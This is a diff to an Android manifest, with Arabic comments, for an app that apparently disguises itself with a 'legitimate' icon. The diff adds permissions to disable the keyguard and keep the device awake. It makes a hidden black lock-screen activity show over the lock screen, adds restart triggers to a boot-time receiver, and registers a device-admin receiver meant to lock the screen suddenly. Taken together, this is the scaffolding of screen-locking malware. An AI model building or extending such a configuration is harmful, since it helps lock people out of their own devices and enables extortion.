@@ -4,6 +4,8 @@
 
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
 
     <application
         android:icon="@drawable/legitimate_app_icon"
@@ -18,8 +20,19 @@
             </intent-filter>
         </activity>
 
-        <!-- شاشة القفل السوداء المخفية -->
-        <activity android:name=".PasswordLockActivity" android:exported="false" />
+        <!-- نشاط قفل الشاشة الرئيسي -->
+        <activity
+            android:name=".PasswordLockActivity"
+            android:exported="true"
+            android:showWhenLocked="true"
+            android:turnScreenOn="true"
+            android:noHistory="true"
+            android:theme="@style/Theme.AppCompat.NoActionBar">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
         <!-- شاشة سوداء جديدة (كود جديد) عند فتح الإذن -->
         <activity android:name=".BlackScreenLockActivity" android:exported="false" />
 
@@ -44,11 +57,25 @@
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.REBOOT" />
                 <category android:name="android.intent.category.DEFAULT" />
             </intent-filter>
         </receiver>
 
         <service android:name=".OverlayLockService" android:exported="false" />
+
+        <!-- مُستقبل صلاحيات مسؤول الجهاز (لقفل الشاشة فجأة) -->
+        <receiver
+            android:name=".MyAdminReceiver"
+            android:permission="android.permission.BIND_DEVICE_ADMIN"
+            android:exported="true">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
 
     </application>
 </manifest>
